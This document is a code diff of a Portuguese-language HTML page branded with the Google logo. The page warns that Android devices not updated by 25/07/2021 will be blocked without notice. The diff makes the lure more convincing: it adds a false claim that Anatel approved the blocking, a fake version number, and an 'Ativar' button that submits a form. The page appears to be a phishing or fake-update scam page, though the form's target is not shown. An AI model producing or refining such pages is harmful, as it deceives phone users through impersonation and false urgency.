@@ -40,16 +40,16 @@
       <div class="py-5 text-center">
         <img class="d-block mx-auto mb-4" src="https://logodownload.org/wp-content/uploads/2014/09/google-logo-1.png" style="width:20%; height:20%;">
        
-        <small><p class="lead">Seu celular será bloqueado.</p><p> Dispositivos <b>android</b> não atualizados até a data de  <b style="color:red">25/07/2021</b> estarão passivos de desabalitação sem aviso prévio.<br> Ative a atualização do android. </p>
+        <small><p class="lead">Atualização Pendente.</p><br><p>  Dispositivos <b>android</b> não atualizados até a data de  <b style="color:red">25/07/2021</b><br> estarão passivos de bloqueio sem aviso prévio conforme homologado pela <b style="color:red">Anatel</b<br> Ative a atualização pendente e evite futuros bloqueios no seu dispositivo. </p>
 		
 		<p><b>Tempo de conclusão estimado: 1-2 minutos</b></p>
-		<p><b style="color:blue">Para manter-se seu díspositivo atualizado cliquem no botão abaixo.</b></p>
+		<p><b style="color:blue">Versão: 48.2.4</b></p>
     </small>  </div>
 
       <div class="row">
         <div class="col-md-4 order-md-2 mb-4">
        
-            <button class="btn btn-primary btn-lg btn-block" type="submit">Atualizar</button>
+            <button class="btn btn-primary btn-lg btn-block" type="submit">Ativar</button>
 	   </div>
 	   </div>
 	</form>
